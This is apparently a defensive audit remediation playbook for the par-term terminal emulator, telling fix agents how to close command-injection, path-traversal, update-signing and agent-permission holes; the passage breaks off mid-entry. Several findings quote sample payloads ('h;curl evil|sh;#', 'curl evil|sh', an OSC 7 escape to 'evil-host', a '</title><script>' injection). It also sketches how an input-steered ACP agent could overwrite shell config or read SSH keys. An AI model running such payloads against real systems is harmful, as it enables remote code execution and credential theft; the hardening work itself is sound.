# Audit Remediation Playbook

> **Companion to `AUDIT.md`** — one entry per issue, ordered to match AUDIT.md's `## Remediation Plan`
> phases. `/fix-audit` reads this file and points each phase agent at its own entries.
>
> **Purpose**: the deep reasoning was spent once, here, where it can be reviewed — not repeated in four
> fresh agent contexts. Every entry names exact files, ordered steps, the reasoning that makes the fix
> correct, and a command that proves it. Do not re-derive the analysis.
>
> **Written against**: `979ecd11`. The audit read `88e5d472`; four commits landed mid-run. See AUDIT.md
> § Mid-Audit Repository Drift.
>
> **Re-verified at `caf96ed3`** (2026-07-29, session `5de7d58b`): all 42 open entries still reproduce
> against the working tree, checked by content rather than by line number since nine commits have shifted
> them. See AUDIT.md § Independent Re-Verification for the figure corrections. **[DOC-004] is DONE**
> (`d1bf97c3`, `f988ab70`) — skip that entry; its doc caveats are live and must be reverted by whoever
> closes the Linux menu code card.

---

## Read This First — Six Traps That Will Waste Your Time

These are not style notes. Each one has already misled an analysis pass in this repo.

1. **`src/ssh/*.rs` IS NOT COMPILED.** `src/ssh/mod.rs` is 11 lines of `pub use par_term_ssh::…` with **zero
   `mod` declarations**. The five sibling files are dead *and divergent*. Grep will match them. Patching them
   compiles clean, passes `make checkall`, and changes nothing at runtime. All SSH work goes in
   `par-term-ssh/src/`. **ARC-001 deletes them in Phase 2 — after that they cannot mislead you.**

2. **`log::` is NOT broken — do not convert call sites.** `src/debug.rs:253` defines `LogCrateBridge`, `:308`
   implements `log::Log` for it, and `src/main.rs:45` installs it with a default of `Info`. All ~1,000 `log::`
   calls reach the debug log. Sub-crates *cannot* use `crate::debug_info!` (it resolves to their own root), so
   `log::` is mandatory there. CLAUDE.md claims otherwise at `:60` and `:239` — that is QA-036, a **doc** fix.

3. **Two files whose `/tmp` references are CORRECT.** `src/debug.rs` already resolves `temp_dir()` properly
   (`:97`, `:224`) — DOC-006 fixes the *docs* that describe it, not the code. And
   `docs/features/CUSTOM_SHADERS.md:1099-1100` plus `CLAUDE.md:218` are owned by a **concurrent session's
   uncommitted work** — do not touch them.

4. **Seven files are dirty and owned by another session.** `par-term-render/src/custom_shader_renderer/mod.rs`,
   `.../transpiler/wgsl_emit.rs`, `par-term-render/src/lib.rs`, `src/ai_inspector/shader_context/context_builder.rs`,
   `.../shader_context/tests.rs`, `src/app/window_state/config_watchers.rs`, and the new
   `par-term-render/src/shader_debug.rs`. Read them; do not write them. Only SEC-006 concerns them, and it is
   verify-only.

5. **Three "unused" symbols that must NOT be deleted.**
   `par-term-config/src/profile_types/profile.rs:285-287` `is_safe_ssh_host` is unreferenced and looks
   removable — SEC-003 needs it. `par-term-config/src/defaults/*` functions look dead but are referenced by
   `#[serde(default = "…")]` **string** attributes. `src/menu/mod.rs:42`'s `#[cfg_attr(…, allow(dead_code))]`
   is a deliberate, board-tracked silencer.

6. **par-mem `find_dead_code` is unreliable here (~34% precision).** Cross-crate calls in a Cargo workspace
   emit no CALLS edge, and `#[serde(default = "…")]` references are unlinked. Do not use it to justify a
   deletion in this repo. Read module declarations instead — that is how ARC-001 was found.

### The Verification Gate

```bash
make checkall          # fmt-check + lint + typecheck + test — NON-mutating, safe to run
make lint-all          # cargo clippy --workspace --all-targets --all-features -- -D warnings
make test-one TEST=x   # single test
make audit             # cargo audit (dependency advisories)
make deny              # cargo deny check
```

**Never run `make fmt` or `make all`** — they rewrite files, including ones you did not touch. Format only
your own files: `cargo fmt -- <paths>`.

Baseline at audit time was **green**: `cargo fmt --all -- --check` exit 0, `clippy --workspace --all-targets`
0 warnings, `cargo test --workspace` **1,965 passed / 0 failed / 18 ignored** across 41 binaries. Any
regression from that baseline is yours.

---

# Phase 1 — Critical Security (Sequential, Blocking)

### [SEC-001] Gate the ACP `fs/write_text_file` RPC arm
- **Files**: `par-term-acp/src/message_handler.rs:94-102`, `par-term-acp/src/fs_tools.rs:81-86` (and the
  `handle_fs_read` sibling at `:86`), `par-term-acp/src/fs_ops.rs:44-71`, reference implementation at
  `par-term-acp/src/permissions.rs:142-184`
- **Steps**:
  1. Read `permissions.rs:142-184` (`is_safe_write_path`) to learn its exact signature and the `safe_paths`
     type it expects. It canonicalizes existing paths and parent-canonicalizes new ones before a
     `starts_with` containment check, serialized behind a lock.
  2. Widen `handle_fs_write`'s signature in `fs_tools.rs:81-86` to accept `ui_tx`, `auto_approve`, and
     `safe_paths` — mirroring what `handle_permission_request` already takes at `message_handler.rs:75-83`.
  3. Inside `handle_fs_write`, before any write, call `is_safe_write_path`. On failure, return the same
     JSON-RPC error shape the existing rejection path in `fs_ops.rs` uses (read it first; do not invent a new
     error code).
  4. Update the call site at `message_handler.rs:94-102` to pass `&ui_tx, &auto_approve, &safe_paths`, exactly
     as `:74-83` does.
  5. Do the same for `handle_fs_read` at `message_handler.rs:85-92` — a read gate matters because an agent can
     exfiltrate `~/.ssh/id_ed25519` just as easily as it can overwrite `~/.zshrc`.
  6. In `fs_ops.rs:44-71`, add at minimum `~/.config/par-term/`, `~/.zshrc`, `~/.bashrc`, `~/.bash_profile`,
     `~/.profile`, `~/.zshenv`, and `~/Library/LaunchAgents/` to `is_sensitive_path`. Prefer converting it to
     an allowlist that delegates to `is_safe_write_path`.
- **Method**: The defense already exists and is well built — this is a wiring defect, not a design gap. That
  is why the fix is small. Two things make it urgent rather than theoretical: an ACP agent's output is steered
  by whatever it reads, so it is untrusted input; and `src/app/window_state/config_watchers.rs:18-19`
  hot-reloads `~/.config/par-term/config.yaml` **by explicit design for ACP agents**, so writing that file
  chains straight into SEC-002's command execution. Note the denylist is the wrong shape for this job —
  enumerating dangerous paths can never be complete, which is why step 6 prefers the allowlist.
  **Pitfall**: `handle_fs_write` is `async`; `is_safe_write_path` takes a lock. Do not hold that lock across
  an `.await` — canonicalize and decide, drop the guard, then write.
- **Verify**:
  ```bash
  make checkall
  make acp-harness ARGS="--list-agents"    # agent discovery still works
  make acp-smoke                            # end-to-end prompt + tool call still completes
  ```
  Then add a unit test asserting a `fs/write_text_file` request targeting `~/.zshrc` is rejected while one
  targeting a path inside `safe_paths` succeeds.

### [SEC-002] Confirm before OSC-7-triggered command execution, and wire the dead toggle
- **Files**: `src/app/tab_ops/profile_auto_switch.rs:132-148` and the duplicate sink at `:304-320`;
  `par-term-config/src/config/config_struct/ssh_config.rs:18,30`;
  `par-term-settings-ui/src/ssh_tab.rs:24`; reference stack at `src/app/triggers/mod.rs:378-530`
- **Steps**:
  1. Read `src/app/triggers/mod.rs:378-530` to extract the existing confirmation path for `RunCommand` —
     specifically how `prompt_before_run` gates execution and how the confirmation is surfaced to the user.
     Reuse that mechanism; do not build a second one.
  2. In `profile_auto_switch.rs`, add an early return at the top of `check_auto_hostname_switch` when
     `config.ssh.ssh_auto_profile_switch` is `false`. This alone makes the existing settings checkbox
     functional.
  3. Route the `term.write(full_cmd.as_bytes())` at `:145` through the trigger confirmation. Apply the
     identical change to the duplicate sink at `:304-320` — **do not fix only one**; grep
     `profile_auto_switch.rs` for `write(` to confirm you have both.
  4. Consider extracting the shared body of `:132-148` and `:304-320` into one function while you are here —
     two copies of a command-execution sink is how one of them stays unpatched.
- **Method**: The asymmetry is the whole argument. The trigger subsystem gates *the same capability* behind
  allowlist + denylist + rate limit + concurrency cap + audit log + `prompt_before_run: true` by default, and
  `par-term-config/src/automation.rs:369-398` documents its denylist as best-effort while naming confirmation
  as the real control. Profile auto-switch has none of it, yet its trigger is a **remote-controlled** OSC 7
  hostname checked every event-loop iteration (`about_to_wait.rs:90`), and a `*` pattern always matches
  (`matchers.rs:269-271`). The dead toggle is verified: `ssh_auto_profile_switch` has exactly three references
  repo-wide — declaration, default, checkbox — and **zero reads**.
  **Pitfall**: this runs on the event loop every iteration. A blocking modal confirmation there will freeze
  the UI; use the trigger subsystem's existing non-blocking prompt path.
- **Verify**:
  ```bash
  make checkall
  ```
  Manually: create a profile with `hostname_patterns: ["*"]` and a `command`, then in a pane run
  `printf '\033]7;file://evil-host/tmp\033\\'` and confirm a prompt appears rather than the command running.
  Then set `ssh_auto_profile_switch: false` and confirm nothing happens at all.

### [SEC-007] Serialize the `env::set_var` tests *(promoted to Phase 1 — conflict file + lockfile change)*
- **Files**: `par-term-mcp/src/lib.rs:688-694` (comment), `:696,704,724,728,744,745,802,806,822,823` (calls);
  `tests/config/config_env_tests.rs` (1 residual); `par-term-mcp/Cargo.toml`; root `Cargo.toml`
- **Steps**:
  1. Add `serial_test` to `[workspace.dependencies]` in the root `Cargo.toml` (the repo's stated policy is to
     centralize any dep used by 2+ crates), then reference it as `serial_test.workspace = true` under
     `[dev-dependencies]` in `par-term-mcp/Cargo.toml`.
  2. Mark every test in `par-term-mcp/src/lib.rs` that calls `set_var`/`remove_var` with `#[serial]`.
  3. Fix the `SAFETY` comment at `:688-694`. It currently argues from key uniqueness. Replace it with the real
     invariant: *no other thread may read any environment variable concurrently*, which `#[serial]` is what
     actually enforces.
  4. Handle the residual `set_var` in `tests/config/config_env_tests.rs` the same way, or better, apply the
     lookup-injection approach commit `979ecd11` already used for the rest of that file — read that commit
     first (`git show 979ecd11 -- tests/config/config_env_tests.rs`) and follow its pattern.
- **Method**: The existing comment asserts the wrong invariant, which is why the hazard was missed. Key
  uniqueness is irrelevant: `setenv` mutates the process-wide `environ` array, and on glibc it may `realloc`
  it, so **any** concurrent `getenv` on **any** key can read freed memory. Real concurrent readers exist in
  the same binary — `resolve_ipc_path()` (`par-term-mcp/src/ipc.rs:107`) reads `std::env::var` at `:109` and
  `dirs::home_dir()` at `:118`. `ci.yml:80` runs `cargo test --workspace` with no `--test-threads=1`.
  **Scope correction**: this is *not* the Linux SIGSEGV cause — `eff2b1e6` found and Miri-proved that (QA-001).
  Treat this as UB and CI flakiness in `par-term-mcp` and the config integration binary.
  **Why Phase 1**: it touches `Cargo.lock`, and `par-term-mcp/src/lib.rs` is also QA-034's target.
- **Verify**:
  ```bash
  make checkall
  cargo test -p par-term-mcp                    # default (parallel) harness must pass
  cargo test -p par-term-mcp -- --test-threads=1  # and serialized
  grep -rn "set_var" --include='*.rs' . | wc -l   # expect only #[serial]-guarded sites
  ```

### [SEC-010] Reduce the OSC 1337 download filename to a basename *(promoted to Phase 1 — conflict file)*
- **Files**: `src/app/file_transfers/mod.rs:322-333`, `:390-399`; reference at
  `src/app/file_transfers/upload.rs:39-42`
- **Steps**:
  1. Read `upload.rs:39-42` — the upload path already reduces to a basename correctly. Copy that approach.
  2. At `mod.rs:322-333`, apply `Path::new(&pending.filename).file_name()` before
     `rfd::FileDialog::new().set_file_name(...)`. Reject (do not silently rename) when `file_name()` returns
     `None` or the name is `.`/`..`.
  3. At `:390-399`, where `DownloadSaveLocation::Cwd` uses `shell_integration_cwd()` as the base, validate
     that the resolved parent is a real directory and canonicalize it before joining.
- **Method**: `rfd` joins the supplied name onto the directory URL, so `../../.ssh/` traverses and an
  **absolute** name replaces the directory outright — meaning the remote positions the save panel wherever it
  likes. `:390-399` is worse because `shell_integration_cwd()` is itself OSC-7-controlled, so the remote
  controls both halves of the path. Held at Medium rather than Critical only because `save_file()` is the sole
  sink and there is no auto-save anywhere, so the user must still confirm a native dialog — do not let that
  mitigation talk you out of the fix, since a dialog pre-pointed at `~/.ssh/` with a plausible filename is a
  realistic click-through.
  **Why Phase 1**: `src/app/file_transfers/mod.rs` is also QA-026's target.
- **Verify**:
  ```bash
  make checkall
  ```
  Add a unit test asserting that `../../.ssh/authorized_keys` and `/etc/passwd` both reduce to a bare basename
  (or are rejected) before reaching `set_file_name`.

---

# Phase 2 — Blocking Structural Changes (Sequential, Blocking)

### [ARC-001] Delete the 869 lines of never-compiled `src/ssh/` code
- **Files**: delete `src/ssh/config_parser.rs`, `src/ssh/discovery.rs`, `src/ssh/history.rs`,
  `src/ssh/known_hosts.rs`, `src/ssh/types.rs`. **Keep** `src/ssh/mod.rs`. Consumer to leave alone:
  `src/ssh_connect_ui.rs:7-8`
- **Steps**:
  1. Confirm the premise yourself — it takes one command and it is the whole justification:
     ```bash
     cat src/ssh/mod.rs                       # expect only `pub use par_term_ssh::…`, no `mod`
     grep -rn "mod ssh" src/ --include='*.rs'  # expect only `pub mod ssh;` in lib.rs
     ```
  2. Before deleting, diff each orphan against its live counterpart to confirm nothing unique is being lost:
     ```bash
     for f in config_parser discovery history known_hosts types; do
       diff -u "src/ssh/$f.rs" "par-term-ssh/src/$f.rs"; done
     ```
     Expect the crate copies to be strictly better. If any orphan contains a *feature* the crate lacks, stop
     and report rather than deleting — port it first.
  3. `git rm` the five files.
  4. Run the gate. Nothing should change, because nothing compiled them.
- **Method**: These are leftovers from `d0d4db00`, which created `par-term-ssh` but never deleted the
  originals, and they have since diverged — `f69d1e9d` fixed bugs only in the crate copy.
  `src/ssh/config_parser.rs` still swallows the config-read error (`Err(_) => return Vec::new()`) where the
  crate logs it; `src/ssh/history.rs` still uses `read_to_string` where the crate streams with `BufReader`.
  `src/ssh/discovery.rs:57` even references `crate::ssh::types::SshHostSource`, which makes the tree *look*
  live. **This runs first in Phase 2 for one reason**: while these files exist, any agent fixing SSH code can
  edit them, see a green gate, and ship nothing. Deleting them removes that failure mode for SEC-003.
- **Verify**:
  ```bash
  make checkall        # must be identical to baseline — 1,965 tests, 0 clippy warnings
  git diff --stat HEAD # expect only deletions
  ```

### [ARC-004] Suballocate the instance buffers so panes share one GPU submit
- **Files**: `par-term-render/src/cell_renderer/mod.rs:106-107` (buffer declarations),
  `par-term-render/src/cell_renderer/pane_render/mod.rs:104,126,172,213,260,791,798`,
  `par-term-render/src/renderer/rendering.rs:61,186,317`
- **Steps**:
  1. Read `pane_render/mod.rs:104-260` end to end first. Map exactly where the per-pane encoder is created
     (`:172`), where instance data is written (`:791`, `:798`), where the render pass opens (`:213`), and where
     `queue.submit` fires (`:260`).
  2. Compute a per-pane byte offset. Give each pane a stride large enough for its worst-case instance count,
     honoring `wgpu`'s `min_uniform_buffer_offset_alignment` / storage-buffer alignment — query it from the
     adapter limits rather than hardcoding 256.
  3. Grow `bg_instance_buffer` and `text_instance_buffer` (`cell_renderer/mod.rs:106-107`) to
     `stride * pane_count`, reallocating when the pane count grows.
  4. Change the uploads at `:791`/`:798` to `write_buffer(..., pane_offset, ...)` instead of offset 0.
  5. Change the draw calls to use a matching instance base so each pane reads its own range.
  6. **Only now** hoist the encoder: create one encoder in `render_split_panes` (`rendering.rs:61`), pass it
     into `render_pane_to_view`, and move the single `queue.submit` to after the pane loop.
- **Method**: The order of steps 2–5 before step 6 is the entire point. The structural cause is that
  `bg_instance_buffer` and `text_instance_buffer` are **single shared buffers** written by every pane at
  **offset 0**. Batching the submits first would let pane N+1 overwrite pane N's vertex data before the GPU
  consumed it — the result renders garbage while compiling cleanly and passing every test, because nothing
  tests multi-pane pixel output. This is a **buffer-addressing change that enables** submit batching, not a
  submit-batching change.
  **Pitfall**: `emit_three_phase_draw_calls` in `par-term-render/src/cell_renderer/render.rs` is the single
  source of truth for draw ordering and has three callers. If you change its signature, update all three, and
  preserve the bgs → text → cursor-overlay order — cursor overlays must stay in phase 3 or beam/underline
  cursors render beneath glyphs.
- **Verify**:
  ```bash
  make checkall
  make build && ./target/dev-release/par-term --screenshot /tmp/panes.png --exit-after 6
  ```
  Split into 6+ panes with a custom shader active and confirm (a) all panes render correct content, (b) frame
  rate recovers from the ~5 FPS regression — use the F3 overlay or `make run-perf`.

### [QA-011] Route screenshots through the live pane path
- **Files**: `par-term-render/src/renderer/rendering.rs:608` (`take_screenshot`), `:645`, `:484-509,577`
  (`render_cells_to_target`); `par-term-render/src/cell_renderer/render.rs:61-71` (`render_to_texture`);
  delete `par-term-render/src/cell_renderer/instance_buffers.rs:93` (`build_instance_buffers`). Consumers:
  `src/app/window_manager/cli_timer.rs:92`, `src/app/window_state/agent_screenshot.rs:23`
- **Steps**:
  1. Re-confirm the chain (one command, and it corrects a claim the architecture audit got wrong):
     ```bash
     grep -rn "render_cells_to_target\|build_instance_buffers" par-term-render/src src
     ```
     Expect `render_cells_to_target` to have exactly one caller — `rendering.rs:645`, inside `take_screenshot`.
  2. Rewrite `take_screenshot` to call `render_split_panes` against an offscreen texture view instead of
     `render_cells_to_target`. Reuse the pane data the live path already gathers.
  3. Delete `build_instance_buffers` (`instance_buffers.rs:93`) and `render_cells_to_target`
     (`rendering.rs:484`) once nothing calls them. Keep `render_to_texture` if the custom-shader intermediate
     path still needs it — check its remaining callers before removing.
  4. Update the now-wrong comment at `instance_buffers.rs:84-88` (or delete it with the function) and fix
     CLAUDE.md's Critical Gotcha, which claims this builder serves "the shader intermediate texture path".
     That resolves ARC-013 as a side effect.
- **Method**: `build_instance_buffers` reads `self.cells` (`instance_buffers.rs:106`) — the **focused pane
  only** — whereas per-cell overlays (search highlights, URL underlines) are applied to `pane_data[].cells` at
  `src/app/render_pipeline/gpu_submit.rs:360`. `rendering.rs:483` already admits the path has "no split-pane
  layout". So screenshots silently differ from the screen. That matters more than a cosmetic diff because both
  consumers — the CLI `--screenshot` flag and the MCP `terminal_screenshot` tool — are the project's
  **agent-operability verification hooks**: automated visual checks and AI-assisted debugging are being fed a
  frame that omits panes and overlays.
  **Depends on ARC-004**, which shifts line numbers throughout these files. Re-read before editing.
- **Verify**:
  ```bash
  make checkall
  make build && ./target/dev-release/par-term --screenshot /tmp/shot.png --exit-after 6
  ```
  With 2+ panes and a URL visible, confirm the PNG shows **all** panes and the URL underline. Then exercise
  the MCP `terminal_screenshot` tool and confirm the same.

---
# Phase 3a — Security (Parallel)

### [SEC-003] Validate the SSH host before building the Quick Connect command
- **Files**: `src/app/render_pipeline/post_render.rs:164-170`; `par-term-ssh/src/types.rs:80-85`
  (`ssh_args`); `par-term-ssh/src/mdns.rs:141`; guard to reuse at
  `par-term-config/src/profile_types/profile.rs:285-287`; argv reference at `src/tab/constructors.rs:355-356`
- **Steps**:
  1. Read `is_safe_ssh_host` (`profile.rs:285-287`) and extend it to reject shell metacharacters
     (`; | & $ \` ( ) < > newline`) in addition to whatever it already checks.
  2. Call it in `post_render.rs` before building `ssh_cmd`. On rejection, surface a user-visible error rather
     than silently skipping.
  3. **Preferred**: replace the string write entirely. `src/tab/constructors.rs:355-356` already spawns `ssh`
     via argv — route Quick Connect through that instead of `format!("ssh {}\n", …)` + `write_str`. Argv
     removes the injection class rather than filtering it.
- **Method**: `ssh_args()` applies no sanitization and mDNS supplies the hostname unvalidated, so a LAN
  attacker advertising a service named `h;curl evil|sh;#` gets execution — the trailing `\n` submits it.
  Below Critical only because `enable_mdns_discovery` defaults to `false` and the user must open Quick Connect
  and select the entry; note the `mdns` cargo feature *does* ship by default, so runtime config is the only
  gate. **Two pitfalls**: (a) after ARC-001 the dead `src/ssh/*.rs` copies are gone — if you still see them,
  ARC-001 has not run and you must not edit them; (b) `is_safe_ssh_host` is currently unreferenced and a
  dead-code pass would remove it. Reference it in this change so it stops looking removable.
- **Verify**: `make checkall`, plus a unit test asserting hostnames containing `;`, `|`, `` ` ``, `$(`, and a
  newline are all rejected.

### [SEC-004] Require confirmation before a remotely-sourced profile command executes
- **Files**: `src/profile/dynamic/fetch.rs:165`; `src/profile/dynamic/manager.rs`; interacts with SEC-002
- **Steps**:
  1. After `serde_yaml_ng::from_str` at `:165`, mark each deserialized `Profile` as remotely sourced — add a
     non-serialized `origin` field (or a wrapper type) so downstream code can distinguish it from a local
     profile.
  2. In the execution path SEC-002 gates, require confirmation unconditionally when `origin` is remote, even
     if the user has otherwise disabled prompting.
  3. Optionally validate the fetched fields — reject a profile whose `hostname_patterns` contains `*` combined
     with a non-empty `command`, which is the exact exploit shape.
- **Method**: The transport is already well defended — HTTPS default, `file://` rejected (`:82-88`), auth
  headers blocked over HTTP (`:93-101`), size cap (`:161`) — so do **not** spend effort there. The gap is that
  the *content* is trusted wholesale and merged into the same manager SEC-002's OSC-7 path reads, so a
  profile-source server shipping `hostname_patterns: ["*"]` + `command: "curl evil|sh"` fires on the next OSC 7
  event. SEC-002 fixes the execution half; this fixes the trust half. Land SEC-002 first if both are in flight.
- **Verify**: `make checkall`, plus a test that a fetched profile carrying a `command` is flagged as requiring
  confirmation regardless of config.

### [SEC-006] ⚠️ VERIFY ONLY — harden the shader dump write
- **Files** *(read-only; a concurrent session owns the dirty ones)*:
  `par-term-render/src/custom_shader_renderer/mod.rs:43-48` (stale docstring), `:55-61`
  (`write_debug_shader_wgsl`); reference pattern at
  `par-term-render/src/custom_shader_renderer/transpiler/wgsl_emit.rs:281,288-293`
- **Steps**:
  1. First check whether the concurrent work has landed: `git status --porcelain par-term-render/`. If those
     files are still dirty, **coordinate before editing** — report the gap and stop.
  2. Once committed, verify what the in-flight change did and did not do:
     ```bash
     grep -c debug_assertions par-term-render/src/custom_shader_renderer/mod.rs   # expect 0 → still a gap
     grep -n "fs::write\|mode(\|OpenOptions\|create_new" \
       par-term-render/src/custom_shader_renderer/mod.rs
     ```
  3. Apply the `wgsl_emit.rs:288-293` pattern to `write_debug_shader_wgsl`: `OpenOptions` with `.mode(0o600)`
     under `#[cfg(unix)]`, plus `create_new`/`O_NOFOLLOW` so a pre-planted symlink is not followed.
  4. Wrap the whole dump in `#[cfg(debug_assertions)]`, matching `wgsl_emit.rs:281`.
  5. Fix the docstring at `:43-48`, which still says "Unix keeps the documented `/tmp` location" — its own
     rewritten body now contradicts that.
- **Method**: The in-flight work fixes the **path** half correctly (all `/tmp` literals gone, the `mod.rs:608`
  test assertion already updated to `shader_debug::debug_dump_dir()`), so do not redo it. It does **not** fix
  the security half: `shader_debug.rs` is a pure path helper with no `OpenOptions`, no mode, no `O_NOFOLLOW`.
  Critically, on **Linux `temp_dir()` is `/tmp`** — shared, world-writable, sticky — so normalizing the path
  does not reduce exposure there at all; macOS only becomes safe incidentally because `$TMPDIR` is per-user.
  The write is also still un-gated, so it runs in release builds. The correct pattern already exists 200 lines
  away and simply was not applied to this writer.
- **Verify**: `make checkall`; then confirm `ls -l "$TMPDIR"/par_term_*_shader.wgsl` shows mode `600`, and that
  a release build produces no dump at all.

### [SEC-005] Add signature verification and per-redirect validation to self-update
- **Files**: `par-term-update/src/binary_ops.rs:91-115`, `par-term-update/src/http.rs:13-15,113-115`,
  `par-term-update/src/install_methods.rs:80-141,150-157,193-203`, `par-term-update/src/self_updater.rs:75,79`
- **Steps**:
  1. Add a `minisign` (or `pgp`) verify step with a **compile-time-pinned public key**. Verify the signature
     **before** `install_methods` touches the live bundle.
  2. In `http.rs`, set ureq's redirect policy to re-run `validate_update_url` on every hop, or disable
     redirects and follow them manually with validation between hops.
  3. In `install_methods.rs:150-157`, add `-R` to the `codesign --verify` invocation pinning Team ID
     `QMLVG482FY`. Treat `spctl` (`:193-203`) failure as fatal rather than a warning.
  4. Restructure `:80-141` to extract into a staging directory and atomically swap only after **all**
     verification passes.
- **Method**: Three weaknesses compose into one statement: the binary and its `.sha256` come from the same
  release `assets` array via the same `download_file`, so replacing the asset replaces the checksum — the
  checksum defends against corruption, not compromise. Preserve the one thing already correct: the SHA256 gate
  precedes any write (`self_updater.rs:75` before `:79`) — do not regress that ordering. **Honesty note**: the
  open-redirect leg is *unproven*; no redirect was demonstrated on an allowlisted GitHub host. Treat step 2 as
  hardening, and do not describe it as a fixed vulnerability.
  **This is a security-sensitive change requiring manual review — commit it separately**, per the repo's
  standing policy on auth/crypto changes.
- **Verify**: `make checkall`; `make audit`; then a dry-run update with a deliberately wrong signature must
  refuse to install and must leave the existing binary untouched.

### [SEC-008] Correct the three `SECURITY.md` drifts *(run AFTER SEC-006 and SEC-013)*
- **Files**: `SECURITY.md:112-116`, `:128`, `:132`
- **Steps**:
  1. `:132` — remove the claim that scripting `WriteText`/`RunCommand` are "currently unimplemented" and that
     "a security model will be defined before implementation". `RunCommand` spawns processes at
     `src/app/window_manager/scripting/mod.rs:385-389`. Describe the real model, including whatever SEC-013
     lands.
  2. `:112-116` — remove the claim that MCP IPC file permissions "are set by the operating system defaults
     rather than explicitly restricted by par-term". `par-term-mcp/src/ipc.rs:23-31` creates them atomically
     with `mode(0o600)`. This *understates* real work.
  3. `:128` — update the transpiled-WGSL description to match whatever SEC-006 finally does.
- **Method**: A security policy that overstates weakness and understates capability misleads users making trust
  decisions and reviewers triaging reports. Sequenced last among the security items because SEC-006 and SEC-013
  both change what the correct text is — writing it first means writing it twice.
- **Verify**: read each corrected claim against the cited code path. No build impact.

### [SEC-009] Escape the OSC title in HTML session logs
- **Files**: `src/session_logger/format_writers.rs:50`, `:70`; existing helper used at
  `src/session_logger/core.rs:462`
- **Steps**: Apply the same `html_escape` the log body already uses at `core.rs:462` to the `<title>{}</title>`
  interpolation at both `:50` and `:70`.
- **Method**: The log *body* is correctly escaped; only the title is not. The title is remote-controlled via
  OSC 0/2, flowing `src/tab/profile_tracking.rs:61` → `:86` → `:117` → `src/tab/session_logging.rs:52-56`, so
  `</title><script>…</script>` executes when the user opens the log in a browser. Narrow because the header is
  written at `start()`, so the injectable window is a manual/hotkey log start *after* the title is set — real,
  but not automatic.
- **Verify**: `make checkall`; start an HTML session log after setting a title containing `</title><script>`
  and confirm the output is escaped.

### [SEC-011] Pin `dtolnay/rust-toolchain` in the publish job
- **Files**: `.github/workflows/publish-crates.yml:61`
- **Steps**: Replace `@master` with `@f133eefe930d61f0d9371efd474daf0125ed3dd1` — the SHA the other **12**
  invocations in this repo already use. Confirm with
  `grep -n "dtolnay/rust-toolchain" .github/workflows/*.yml`.
- **Method**: This is an outlier, not the norm, which is what makes it a clean fix. The job holds
  `CARGO_REGISTRY_TOKEN` (`:107`, used `:144`), so a push to that upstream branch executes in a token-bearing
  job and could publish malicious crates. Verify the SHA resolves before committing — never invent a ref.
- **Verify**: `grep -c "rust-toolchain@master" .github/workflows/` returns 0; the next workflow run succeeds.

### [SEC-012] Quote the dispatch input in the CI test command
- **Files**: `.github/workflows/ci-linux.yml:85-89`, `.github/workflows/ci-windows.yml:94-98`
- **Steps**: Move `${{ inputs.test_args }}` into an `env:` block (e.g. `TEST_ARGS: ${{ inputs.test_args }}`)
  and reference `"$TEST_ARGS"` in the `run:` script. Do the same for the `threads` input.
- **Method**: `${{ }}` is substituted by the Actions runner **before** the shell parses the line, so
  `--workspace; curl evil|sh` executes as a second command. Passing through `env:` makes the value data rather
  than source text. Requires `workflow_dispatch` (repo write) so this is a privilege-boundary hygiene fix, not
  fork-reachable — fix it, but do not rate it as a public vulnerability.
- **Verify**: dispatch each workflow with a benign `test_args` and confirm it still runs correctly.

### [SEC-013] Give scripting `WriteText` a confirmation gate or the denylist
- **Files**: `par-term-scripting/src/protocol.rs:243-251`; `par-term-config/src/scripting.rs:10-86`;
  denylist at `par-term-config/src/automation.rs:401`; path at
  `src/app/window_manager/scripting/mod.rs:266-296`
- **Steps**:
  1. Add a `prompt_before_write_text: bool` field to `ScriptConfig` (`scripting.rs:10-86`), defaulting to
     `true`, mirroring `automation.rs`'s `prompt_before_run`.
  2. Gate the `WriteText` path (`scripting/mod.rs:266-296`) on it, **or** route payloads through
     `check_command_denylist`.
  3. Add the settings UI control and the search keyword, per the repo's config-option workflow.
- **Method**: `protocol.rs:243-251` strips only ESC-initiated sequences, letting printable characters and
  newlines through — so a script can type a full command plus `\n` into the PTY with no denylist check. The
  argument for a confirmation field rather than more filtering: `automation.rs:384` explicitly names
  `prompt_before_run: true` as "the recommended and default setting" for real protection and documents its own
  denylist as best-effort, yet `ScriptConfig` has no such field at all. The compensating control the denylist
  docs point to simply does not exist on this path. Gated today by opt-in `allow_write_text` (default false),
  which is why this is Medium.
- **Verify**: `make checkall`; `cargo test -p par-term-scripting`; confirm a `WriteText` payload containing a
  newline prompts (or is denied) with default config.

### [SEC-014] Stop escalating the agent's own permission mode
- **Files**: `src/app/window_state/impl_agent.rs:295`
- **Steps**: Remove the `agent.set_mode("bypassPermissions")` call. If par-term's own auto-approve needs to be
  conveyed, use a par-term-side flag that governs par-term's prompts only.
- **Method**: par-term is actively instructing the external agent to disable *its own* internal safeguards, so
  the agent stops prompting for tool uses par-term never sees. That compounds SEC-001: an ungated
  `fs/write_text_file` plus an agent told not to ask itself removes every checkpoint. par-term's auto-approve
  should mean "I will not prompt you", not "you should not protect yourself".
- **Verify**: `make checkall`; `make acp-smoke` with auto-approve on, confirming the agent still functions and
  no `bypassPermissions` is sent (check the harness transcript).

### [SEC-015] Add a secret-scanning pre-commit gate
- **Files**: new `.pre-commit-config.yaml`; `Makefile` (add/confirm a `pre-commit` target)
- **Steps**:
  1. Create `.pre-commit-config.yaml` with `gitleaks` and `detect-private-key` hooks.
  2. Add a `pre-commit` Makefile target running `pre-commit run --all-files`. Note `Makefile` already has a
     `pre-commit` target (`fmt-check lint test`) — either rename that or have it also invoke the hooks; do not
     silently shadow it.
  3. Run `pre-commit install` and `pre-commit run --all-files` once to establish a clean baseline.
- **Method**: **No committed secrets exist** — the working tree, 1,484 ref-reachable commits, and 427 dangling
  blobs were all checked clean, and the single `BEGIN RSA PRIVATE KEY` history hit (`ac5d0c07`) is
  documentation prose. So this is purely preventive; do not go hunting for a leak that is not there. The value
  is that nothing currently stops the next one.
- **Verify**: `pre-commit run --all-files` passes; a scratch commit containing a fake AWS key is rejected.

### [SEC-016] Create the debug log with restricted mode instead of chmod-after-open
- **Files**: `src/debug.rs:139`; correct pattern at `par-term-mcp/src/ipc.rs:29`
- **Steps**: Replace the post-open `chmod` with `OpenOptions::new().mode(0o600)` at creation under
  `#[cfg(unix)]`, matching `ipc.rs:29`.
- **Method**: On multi-user Linux an attacker can pre-create the file mode 0666, own it, watch the `let _ =`
  chmod fail silently, and read all debug output. The file is otherwise well hardened — symlink removal at
  `:102-108`, `O_NOFOLLOW` at `:122` — so this is closing the last gap, not a rewrite. **Do not change the
